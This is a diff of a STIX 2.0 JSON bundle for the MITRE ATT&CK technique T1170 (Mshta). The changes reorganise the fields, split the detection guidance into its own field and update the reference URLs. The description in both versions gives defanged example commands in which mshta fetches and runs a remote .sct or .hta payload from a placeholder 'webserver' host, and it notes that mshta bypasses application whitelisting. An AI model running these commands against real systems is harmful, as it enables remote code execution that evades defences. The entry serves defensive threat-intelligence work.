@@ -1,92 +1,94 @@
 {
+    "type": "bundle",
+    "id": "bundle--6b53b3a8-4c9d-45a1-9366-a7ce74304f45",
+    "spec_version": "2.0",
     "objects": [
         {
+            "id": "attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
             "name": "Mshta",
-            "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: GitHub SubTee The List)\n\nDetection: Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.\n\nPlatforms: Windows\n\nData Sources: Process monitoring, Process command-line parameters\n\nDefense Bypassed: Application whitelisting\n\nPermissions Required: User\n\nRemote Support: No\n\nContributors: Ricardo Dias, Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",
-            "kill_chain_phases": [
-                {
-                    "kill_chain_name": "mitre-attack",
-                    "phase_name": "defense-evasion"
-                },
-                {
-                    "kill_chain_name": "mitre-attack",
-                    "phase_name": "execution"
-                }
-            ],
+            "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: GitHub SubTee The List)",
             "external_references": [
                 {
-                    "url": "https://attack.mitre.org/wiki/Technique/T1170",
-                    "source_name": "mitre-attack",
-                    "external_id": "T1170"
+                    "external_id": "T1170",
+                    "url": "https://attack.mitre.org/techniques/T1170",
+                    "source_name": "mitre-attack"
                 },
                 {
+                    "url": "https://en.wikipedia.org/wiki/HTML_Application",
                     "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
-                    "source_name": "Wikipedia HTML Application",
-                    "url": "https://en.wikipedia.org/wiki/HTML%20Application"
+                    "source_name": "Wikipedia HTML Application"
                 },
                 {
+                    "url": "https://msdn.microsoft.com/library/ms536471.aspx",
                     "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
-                    "source_name": "MSDN HTML Applications",
-                    "url": "https://msdn.microsoft.com/library/ms536471.aspx"
+                    "source_name": "MSDN HTML Applications"
                 },
                 {
+                    "url": "https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf",
                     "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.",
-                    "source_name": "Cylance Dust Storm",
-                    "url": "https://www.cylance.com/content/dam/cylance/pdfs/reports/Op%20Dust%20Storm%20Report.pdf"
+                    "source_name": "Cylance Dust Storm"
                 },
                 {
+                    "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
                     "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
-                    "source_name": "Red Canary HTA Abuse Part Deux",
-                    "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/"
+                    "source_name": "Red Canary HTA Abuse Part Deux"
                 },
                 {
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html",
                     "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
-                    "source_name": "FireEye Attacks Leveraging HTA",
-                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html"
-                },
-                {
-                    "description": "Dove, A. (2016, March 23). Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
-                    "source_name": "Airbus Security Kovter Analysis"
-                },
-                {
-                    "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
-                    "source_name": "FireEye FIN7 April 2017",
-                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+                    "source_name": "FireEye Attacks Leveraging HTA"
                 },
                 {
                     "description": "[ Smith, C. (2017, July 14). TheList.txt. Retrieved October 27, 2017.",
                     "source_name": "GitHub SubTee The List"
+                },
+                {
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
+                    "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+                    "source_name": "FireEye FIN7 April 2017"
+                },
+                {
+                    "description": "Dove, A. (2016, March 23). Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+                    "source_name": "Airbus Security Kovter Analysis"
                 }
             ],
             "object_marking_refs": [
                 "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
             ],
-            "created": "2018-01-16T16:13:52.465Z",
-            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-            "x_mitre_platforms": [
-                "Windows"
-            ],
+            "x_mitre_version": "1.0",
             "x_mitre_data_sources": [
                 "Process monitoring",
                 "Process command-line parameters"
             ],
-            "x_mitre_defense_bypassed": [
-                "Application whitelisting"
-            ],
-            "x_mitre_permissions_required": [
-                "User"
-            ],
-            "x_mitre_remote_support": false,
             "x_mitre_contributors": [
                 "Ricardo Dias",
                 "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank"
             ],
-            "id": "attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec",
-            "modified": "2018-04-18T17:59:24.739Z",
-            "type": "attack-pattern"
+            "x_mitre_defense_bypassed": [
+                "Application whitelisting"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_remote_support": false,
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "type": "attack-pattern",
+            "kill_chain_phases": [
+                {
+                    "phase_name": "defense-evasion",
+                    "kill_chain_name": "mitre-attack"
+                },
+                {
+                    "phase_name": "execution",
+                    "kill_chain_name": "mitre-attack"
+                }
+            ],
+            "modified": "2018-10-17T00:14:20.652Z",
+            "created": "2018-01-16T16:13:52.465Z"
         }
-    ],
-    "type": "bundle",
-    "id": "bundle--da24a36f-9fd1-4b81-abdd-5a97f052bf14",
-    "spec_version": "2.0"
+    ]
 }
